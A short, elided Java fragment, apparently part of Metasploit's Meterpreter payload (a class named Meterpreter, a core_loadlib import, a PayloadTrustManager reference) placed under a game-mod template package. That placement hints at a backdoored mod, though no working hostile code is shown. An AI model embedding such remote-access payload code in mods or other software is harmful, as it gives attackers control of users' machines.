...
import com.example.examplemod.meterpreter.core.core_loadlib;
...
public class Meterpreter {
    ...
    protected String getPayloadTrustManager() {
        return "com.example.examplemod.meterpreter.PayloadTrustManager";
    }
    ...
    /**
     * Register a new channel in this meterpreter. Used only by <removed by pyfffe>
     *
